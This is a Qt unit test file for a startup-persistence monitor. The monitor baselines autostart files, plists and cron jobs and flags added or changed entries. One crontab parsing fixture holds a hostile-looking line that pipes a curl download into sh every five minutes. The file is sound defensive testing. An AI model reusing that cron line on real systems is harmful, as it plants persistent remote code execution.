#include <QTest>
#include <QTemporaryDir>
#include <QFile>
#include "persistence_watch.h"

class TestPersistenceWatch : public QObject
{
    Q_OBJECT

private:
    static PersistenceEntry entry(const QString &key, const QString &fp = QString("h1"))
    {
        return {key, key, fp};
    }

private slots:
    void diff_identicalListsAreEmpty();
    void diff_reportsAdded();
    void diff_reportsChangedFingerprint();
    void diff_reportsRemoved();
    void diff_flaggedCombinesAddedAndChanged();

    void serialize_roundTrips();
    void deserialize_rejectsGarbageAndWrongVersion();

    void evaluate_firstRunSeedsWithoutFlagging();
    void evaluate_flagsNewEntryAfterSeeding();
    void evaluate_flagsChangedEntry();
    void evaluate_persistsBaselineAcrossInstances();
    void evaluate_corruptBaselineReseeds();
    void evaluate_removedEntryComingBackIsFlagged();
    void acknowledge_allMovesBaselineForward();
    void acknowledge_subsetKeepsOtherEntriesFlagged();

    void parseCrontab_skipsCommentsBlankAndEnvLines();
    void parseCrontab_splitsScheduleAndCommand();
    void parseCrontab_handlesSpecialSchedules();

    void keyFor_distinguishesFilesAndCron();
    void entryFor_cronHasNoFingerprint();
    void entryFor_fileFingerprintsContent();

    void fingerprint_ignoresLinuxEnableKeys();
    void fingerprint_ignoresPlistDisabledKey();
    void fingerprint_changesWhenCommandChanges();
};

void TestPersistenceWatch::diff_identicalListsAreEmpty()
{
    const QList<PersistenceEntry> a{entry("a"), entry("b")};
    const PersistenceDiff d = PersistenceWatch::diff(a, a);
    QVERIFY(d.added.isEmpty());
    QVERIFY(d.changed.isEmpty());
    QVERIFY(d.removed.isEmpty());
    QVERIFY(!d.hasFlagged());
}

void TestPersistenceWatch::diff_reportsAdded()
{
    const PersistenceDiff d = PersistenceWatch::diff({entry("a")}, {entry("a"), entry("b")});
    QCOMPARE(d.added, QStringList{"b"});
    QVERIFY(d.changed.isEmpty());
    QVERIFY(d.hasFlagged());
}

void TestPersistenceWatch::diff_reportsChangedFingerprint()
{
    const PersistenceDiff d = PersistenceWatch::diff({entry("a", "old")}, {entry("a", "new")});
    QCOMPARE(d.changed, QStringList{"a"});
    QVERIFY(d.added.isEmpty());
}

void TestPersistenceWatch::diff_reportsRemoved()
{
    const PersistenceDiff d = PersistenceWatch::diff({entry("a"), entry("b")}, {entry("a")});
    QCOMPARE(d.removed, QStringList{"b"});
    QVERIFY(!d.hasFlagged());
}

void TestPersistenceWatch::diff_flaggedCombinesAddedAndChanged()
{
    const PersistenceDiff d = PersistenceWatch::diff({entry("a", "old")},
                                                     {entry("a", "new"), entry("b")});
    QCOMPARE(d.flagged(), (QSet<QString>{"a", "b"}));
}

void TestPersistenceWatch::serialize_roundTrips()
{
    const QList<PersistenceEntry> in{{"file:/x", "X", "abc"}, {"cron:@reboot /bin/y", "y", ""}};
    QList<PersistenceEntry> out;
    QVERIFY(PersistenceWatch::deserialize(PersistenceWatch::serialize(in), &out));
    QCOMPARE(out.size(), 2);
    QCOMPARE(out[0].key, QString("file:/x"));
    QCOMPARE(out[0].label, QString("X"));
    QCOMPARE(out[0].fingerprint, QString("abc"));
    QCOMPARE(out[1].key, QString("cron:@reboot /bin/y"));
    QVERIFY(out[1].fingerprint.isEmpty());
}

void TestPersistenceWatch::deserialize_rejectsGarbageAndWrongVersion()
{
    QList<PersistenceEntry> out;
    QVERIFY(!PersistenceWatch::deserialize("not json", &out));
    QVERIFY(!PersistenceWatch::deserialize("[]", &out));
    QVERIFY(!PersistenceWatch::deserialize(R"({"version":99,"entries":[]})", &out));
    QVERIFY(!PersistenceWatch::deserialize(R"({"version":1,"entries":[{"label":"no key"}]})", &out));
    QVERIFY(PersistenceWatch::deserialize(R"({"version":1,"entries":[]})", &out));
}

void TestPersistenceWatch::evaluate_firstRunSeedsWithoutFlagging()
{
    QTemporaryDir dir;
    PersistenceWatch w(dir.filePath("sub/baseline.json"));
    const PersistenceWatch::Evaluation e = w.evaluate({entry("a"), entry("b")});
    QVERIFY(e.seeded);
    QVERIFY(!e.diff.hasFlagged());
    QVERIFY(QFile::exists(dir.filePath("sub/baseline.json")));
}

void TestPersistenceWatch::evaluate_flagsNewEntryAfterSeeding()
{
    QTemporaryDir dir;
    PersistenceWatch w(dir.filePath("baseline.json"));
    w.evaluate({entry("a")});

    const PersistenceWatch::Evaluation e = w.evaluate({entry("a"), entry("evil")});
    QVERIFY(!e.seeded);
    QCOMPARE(e.diff.added, QStringList{"evil"});

    // Not acknowledged, so it stays flagged on the next scan.
    QCOMPARE(w.evaluate({entry("a"), entry("evil")}).diff.added, QStringList{"evil"});
}

void TestPersistenceWatch::evaluate_flagsChangedEntry()
{
    QTemporaryDir dir;
    PersistenceWatch w(dir.filePath("baseline.json"));
    w.evaluate({entry("a", "good")});
    QCOMPARE(w.evaluate({entry("a", "tampered")}).diff.changed, QStringList{"a"});
}

void TestPersistenceWatch::evaluate_persistsBaselineAcrossInstances()
{
    QTemporaryDir dir;
    const QString path = dir.filePath("baseline.json");
    PersistenceWatch(path).evaluate({entry("a")});

    const PersistenceWatch::Evaluation e = PersistenceWatch(path).evaluate({entry("a"), entry("b")});
    QVERIFY(!e.seeded);
    QCOMPARE(e.diff.added, QStringList{"b"});
}

void TestPersistenceWatch::evaluate_corruptBaselineReseeds()
{
    QTemporaryDir dir;
    const QString path = dir.filePath("baseline.json");
    QFile f(path);
    QVERIFY(f.open(QIODevice::WriteOnly));
    f.write("{ truncated");
    f.close();

    PersistenceWatch w(path);
    const PersistenceWatch::Evaluation e = w.evaluate({entry("a")});
    QVERIFY(e.seeded);
    QVERIFY(!w.evaluate({entry("a")}).seeded);
}

void TestPersistenceWatch::evaluate_removedEntryComingBackIsFlagged()
{
    QTemporaryDir dir;
    PersistenceWatch w(dir.filePath("baseline.json"));
    w.evaluate({entry("a"), entry("b")});

    const PersistenceWatch::Evaluation gone = w.evaluate({entry("a")});
    QCOMPARE(gone.diff.removed, QStringList{"b"});
    QVERIFY(!gone.diff.hasFlagged());

    QCOMPARE(w.evaluate({entry("a"), entry("b")}).diff.added, QStringList{"b"});
}

void TestPersistenceWatch::acknowledge_allMovesBaselineForward()
{
    QTemporaryDir dir;
    PersistenceWatch w(dir.filePath("baseline.json"));
    w.evaluate({entry("a")});

    const QList<PersistenceEntry> now{entry("a", "v2"), entry("b")};
    QVERIFY(w.evaluate(now).diff.hasFlagged());
    QVERIFY(w.acknowledge(now));
    QVERIFY(!w.evaluate(now).diff.hasFlagged());
}

void TestPersistenceWatch::acknowledge_subsetKeepsOtherEntriesFlagged()
{
    QTemporaryDir dir;
    PersistenceWatch w(dir.filePath("baseline.json"));
    w.evaluate({entry("a")});

    const QList<PersistenceEntry> now{entry("a"), entry("b"), entry("c")};
    QVERIFY(w.acknowledge(now, {"b"}));
    QCOMPARE(w.evaluate(now).diff.added, QStringList{"c"});
}

void TestPersistenceWatch::parseCrontab_skipsCommentsBlankAndEnvLines()
{
    const QString text =
        "# m h dom mon dow command\n"
        "\n"
        "MAILTO=root\n"
        "PATH=/usr/bin:/bin\n"
        "0 3 * * * /usr/local/bin/backup.sh\n";
    const QList<CronEntry> jobs = PersistenceWatch::parseCrontab(text);
    QCOMPARE(jobs.size(), 1);
    QCOMPARE(jobs[0].command, QString("/usr/local/bin/backup.sh"));
}

void TestPersistenceWatch::parseCrontab_splitsScheduleAndCommand()
{
    const QList<CronEntry> jobs =
        PersistenceWatch::parseCrontab("*/5 * * * *   curl -s http://x/y | sh  \n");
    QCOMPARE(jobs.size(), 1);
    QCOMPARE(jobs[0].schedule, QString("*/5 * * * *"));
    QCOMPARE(jobs[0].command, QString("curl -s http://x/y | sh"));
    QCOMPARE(jobs[0].raw, QString("*/5 * * * *   curl -s http://x/y | sh"));
}

void TestPersistenceWatch::parseCrontab_handlesSpecialSchedules()
{
    const QList<CronEntry> jobs = PersistenceWatch::parseCrontab("@reboot /opt/agent --daemon\n");
    QCOMPARE(jobs.size(), 1);
    QCOMPARE(jobs[0].schedule, QString("@reboot"));
    QCOMPARE(jobs[0].command, QString("/opt/agent --daemon"));
}

void TestPersistenceWatch::keyFor_distinguishesFilesAndCron()
{
    StartupAppData file;
    file.filePath = "/home/u/.config/autostart/a.desktop";
    const CronEntry cron{"@reboot", "/bin/x", "@reboot /bin/x"};
    const StartupAppData job = PersistenceWatch::itemForCron(cron);

    QCOMPARE(PersistenceWatch::keyFor(file), QString("file:/home/u/.config/autostart/a.desktop"));
    QCOMPARE(PersistenceWatch::keyFor(job), QString("cron:@reboot /bin/x"));
    QVERIFY(job.readOnly);
    QCOMPARE(job.category, LoginItemCategory::CronJob);
}

void TestPersistenceWatch::entryFor_cronHasNoFingerprint()
{
    const StartupAppData job = PersistenceWatch::itemForCron({"@reboot", "/bin/x", "@reboot /bin/x"});
    QVERIFY(PersistenceWatch::entryFor(job).fingerprint.isEmpty());
}

void TestPersistenceWatch::entryFor_fileFingerprintsContent()
{
    QTemporaryDir dir;
    const QString path = dir.filePath("a.desktop");
    QFile f(path);
    QVERIFY(f.open(QIODevice::WriteOnly));
    f.write("[Desktop Entry]\nName=A\nExec=/bin/a\n");
    f.close();

    StartupAppData item;
    item.filePath = path;
    const PersistenceEntry e = PersistenceWatch::entryFor(item);
    QCOMPARE(e.fingerprint, PersistenceWatch::fingerprintContent("[Desktop Entry]\nName=A\nExec=/bin/a\n"));
    QVERIFY(!e.fingerprint.isEmpty());

    item.filePath = dir.filePath("missing.desktop");
    QVERIFY(PersistenceWatch::entryFor(item).fingerprint.isEmpty());
}

void TestPersistenceWatch::fingerprint_ignoresLinuxEnableKeys()
{
    const QByteArray base = "[Desktop Entry]\nName=A\nExec=/bin/a\n";
    const QString plain = PersistenceWatch::fingerprintContent(base);
    QCOMPARE(PersistenceWatch::fingerprintContent(base + "Hidden=true\n"), plain);
    QCOMPARE(PersistenceWatch::fingerprintContent(base + "X-GNOME-Autostart-enabled=false\n"), plain);
}

void TestPersistenceWatch::fingerprint_ignoresPlistDisabledKey()
{
    const QByteArray base = "<dict>\n\t<key>Label</key>\n\t<string>x</string>\n</dict>\n";
    const QByteArray disabled =
        "<dict>\n\t<key>Label</key>\n\t<string>x</string>\n\t<key>Disabled</key>\n\t<true/>\n</dict>\n";
    QCOMPARE(PersistenceWatch::fingerprintContent(disabled), PersistenceWatch::fingerprintContent(base));
}

void TestPersistenceWatch::fingerprint_changesWhenCommandChanges()
{
    QVERIFY(PersistenceWatch::fingerprintContent("Exec=/bin/a\n")
            != PersistenceWatch::fingerprintContent("Exec=/bin/b\n"));
}

QTEST_MAIN(TestPersistenceWatch)
#include "test_persistence_watch.moc"
